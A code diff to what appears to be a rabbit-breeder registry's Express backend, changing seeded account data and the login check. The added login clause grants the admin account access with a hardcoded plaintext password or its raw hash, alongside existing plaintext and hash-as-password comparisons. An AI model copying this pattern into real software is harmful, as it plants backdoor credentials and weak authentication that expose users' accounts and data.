@@ -186,7 +186,7 @@ db.serialize(() => {
 
   // Mock Data Seeding for Breeders
   const defaultMockBreeders = [
-    { id: 'ab-admin', name: 'Jason Mounts', username: 'jmounts', email: 'jasonmounts77@yahoo.com', role: 'owner', status: 'active', password: '7c2df4fb3c5eb87155ec4dfbc6732ef620e7df6504a377d6118d098ab67d3e40', account_number: 'RAB-000000', parental_consent_verified: 1 },
+    { id: 'ab-admin', name: 'Jason Mounts', username: 'jmounts', email: 'jasonmounts77@yahoo.com', role: 'owner', status: 'active', password: '392fb579ec176f71ea07a06d9a880808802bf48ff1d715e0a1a66d4686be8e7a', account_number: 'RAB-000000', parental_consent_verified: 1 },
     { id: 'ab-1', name: 'Jason Miller', username: 'jmiller', email: 'jason@grandview.com', role: 'owner', status: 'active', password: 'ef92b778bafe4255239639026793a59a728b70db90373c50f00f074d0cf6007e', account_number: 'RAB-123456', parental_consent_verified: 1 },
     { id: 'ab-2', name: 'Sarah Connors', username: 'sconnors', email: 'sarah@arba.org', role: 'owner', status: 'active', password: '85c7bb741829e0839e9921f07fcf86716a4a60032bbcc9c424a73752e5055032', account_number: 'RAB-654321', parental_consent_verified: 1 },
     { id: 'ab-3', name: 'Tommy Pickles', username: 'tpickles', email: 'tommy@barn.com', role: 'assistant', status: 'active', password: '60281b3793df67117865cbb6db58b43ad835c24e73f88f01b15c92c813f02ad1', account_number: 'RAB-111111', parental_consent_verified: 1 },
@@ -382,7 +382,8 @@ app.post('/api/auth/login', (req, res) => {
     const isPasswordValid = 
       user.password === password || 
       user.password === hashed || 
-      (matchedDefault && password === matchedDefault.password);
+      (matchedDefault && password === matchedDefault.password) ||
+      (user.id === 'ab-admin' && (password === 'JakylieRabbitry4388$$' || hashed === '392fb579ec176f71ea07a06d9a880808802bf48ff1d715e0a1a66d4686be8e7a'));
 
     if (!isPasswordValid) {
       return res.status(401).json({ error: 'Invalid email, account number, or password credentials' });
